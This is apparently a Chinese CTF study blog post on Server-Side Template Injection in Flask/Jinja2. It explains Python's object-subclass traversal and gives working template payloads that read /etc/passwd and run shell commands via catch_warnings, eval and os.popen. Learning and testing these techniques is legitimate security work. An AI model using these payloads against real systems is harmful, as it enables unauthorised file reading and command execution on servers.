---
title: SSTI漏洞浅析
categories:
  - [ctf-web]
  - 渗透
date: 2023-10-27 22:11:40
tags:
---


# SSTI漏洞

- 定义：SSTI 就是服务器端模板注入 (Server-Side Template Injection)
- 基础知识：例如，在jinja2模板引擎中，{ { } }是变量包裹标识符。{ { } }了并不仅仅可以传递变量，还可以执行一些简单的表达式。
<!-- more -->
## Flask jinja2模版漏洞

魔术方法：

```python
__dict__ #保存类实例或对象实例的属性变量键值对字典

__class__ #返回调用的参数类型

__mro__ #返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__
__bases__

__subclasses__()#返回子类

__init__#类的初始化方法

__globals__#函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价
```

**利用方法&实现思路**：在python中，object类是Python中所有类的基类，如果定义没有指定继承哪个类，则默认继承object类。通过python的对象的继承来一步步实现文件读取和命令执行。

### **基本步骤**

1. 找到父类<type 'object'>
2. 寻找子类
3. 找关于命令执行或者文件操作的模块

### 准备工作

拿到object类的方法：

```python
''.__class__.__mro__[2]
[].__class__.__base__
[].__class__.__bases__[0]
#具体情况感觉不一定，需要验证。利用''.__class__.__mro__ 再确定索引
```

获取子类：

```python
#object.__subclasses__()
''.__class__.__mro__[2].__subclasses__()
```

找到object的子类warnings.catch_warnings：

```python
#[].__class__.__base__.__subclasses__().index(warnings.catch_warnings) 该函数暂未成功实现过
[].__class__.__base__.__subclasses__()[59]#默认在59,但有时候会不在，可以利用循环去找，下列具体操作中有示例
```

### 具体操作

#### 读取文件

利用file类：

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
	{% if c.__name__=='file' %}
		{{"find!"}}
		{{ c("/etc/passwd").readlines() }}
	{% endif %}
{% endfor %}

```

或者还是利用catch_warnings类：

```jinja2
{#提前找到了catch_warnings#}
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read()}}
{#利用循环找catch_warnings#}
{% for c in [].__class__.__base__.__subclasses__() %}
	{% if c.__name__=='catch_warnings' %}      
		{{c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}
	{% endif %}
{% endfor %}
```

```jinja2
{#利用循环找catch_warnings#}
{% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__=='catch_warnings' %}
        {{ c.__init__.__globals__['__builtins__'].eval('open("/etc/passwd", "r").read()') }}
    {% endif %}
{% endfor %}
```

#### 命令执行

(有些执行命令的方式无回显，而当前方法可以看到回显)

如果catch_warnings已经找到：

```jinja2
{{[].__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()")}}
```

如果没找到（利用循环遍历寻找）：

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__=='catch_warnings' %}
      {{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()")}}
    {% endif %}
{% endfor %}
```

### 绕过过滤

待学习。。。

## 参考链接

https://houwenda.github.io/2020/02/22/jinja2-ssti/ 

https://zhuanlan.zhihu.com/p/93746437

https://zhuanlan.zhihu.com/p/596279414
